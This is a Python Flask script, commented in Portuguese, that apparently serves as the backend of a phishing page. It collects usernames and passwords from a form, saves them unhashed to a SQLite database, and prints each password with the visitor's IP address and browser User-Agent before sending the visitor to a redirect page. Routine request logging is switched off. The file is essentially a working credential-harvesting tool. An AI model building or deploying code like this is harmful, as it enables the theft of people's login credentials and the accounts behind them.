from flask import *
import logging
import sqlite3

banco = sqlite3.connect('.database/sql.db',check_same_thread=False)
cursor = banco.cursor()
sql = 'SELECT * FROM dados WHERE id = ? '
def create(n, s):
    cursor.execute("CREATE TABLE IF NOT EXISTS dados (id integer PRIMARY KEY AUTOINCREMENT, nome text,  senha text) ")
    cursor.execute(f"INSERT INTO dados (nome, senha) VALUES(?,?)", (n,s))
    banco.commit()
    
def read(n):
    for row in cursor.execute(sql, (n)):
        id = row[0]
        login = row[1]
        senha = row[2]
        return login, senha
    


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
dv = '-'*30
#PAGINA RAIZ
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
         print ('Iniciado!\n', dv)
         return render_template('index.html')
    elif request.method == 'POST':
        user = request.form['USER']
        senha = request.form['SENHA']
        create(user,senha)
        agent = request.headers.get('User-Agent')
        print ('Usuario:', user, '\nSenha:', senha,'\nIpv4:',request.environ['HTTP_X_FORWARDED_FOR'],'\nUser-Agent:', agent,'\n',dv)
        return render_template('redirect.html')
app.run(debug=True, host='127.0.0.1', port=5000)